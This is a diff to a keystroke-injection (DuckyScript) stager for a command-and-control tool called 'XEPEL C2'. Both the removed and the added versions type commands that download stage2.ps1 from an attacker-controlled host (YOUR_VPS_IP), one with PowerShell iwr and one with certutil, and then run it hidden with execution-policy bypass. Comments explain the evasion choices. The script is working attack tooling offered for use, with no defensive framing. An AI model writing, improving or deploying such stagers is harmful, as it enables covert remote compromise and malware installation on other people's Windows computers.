@@ -1,8 +1,29 @@
-REM XEPEL C2 – Stage 1 Stager
-REM cmd /c wrapper fixes Run dialog permission error
+REM XEPEL C2 – Robust Two Stage HID
+REM Entry via cmd.exe, drops to PS, fetches stage2
+REM Works Windows 10 and 11
 
-DELAY 2000
+DELAY 3000
+
+REM Open Run dialog
 GUI r
 DELAY 1500
-STRING cmd /c powershell -w hidden -ep bypass -c "iwr -Uri 'http://YOUR_VPS_IP/stage2.ps1' -OutFile '$env:TEMP\s.ps1'; Start-Process powershell -ArgumentList '-w hidden -ep bypass -f $env:TEMP\s.ps1' -Verb RunAs"
+
+REM Launch cmd.exe first - Windows trusts this
+STRING cmd
+ENTER
+DELAY 2000
+
+REM Now inside cmd.exe terminal window
+REM Use certutil to download stage2 - more trusted than iwr
+STRING certutil -urlcache -split -f http://YOUR_VPS_IP/stage2.ps1 %TEMP%\s.ps1
+ENTER
+DELAY 3000
+
+REM Execute via powershell from cmd
+STRING powershell -ep bypass -w hidden -f %TEMP%\s.ps1
+ENTER
+DELAY 1000
+
+REM Close cmd window
+STRING exit
 ENTER
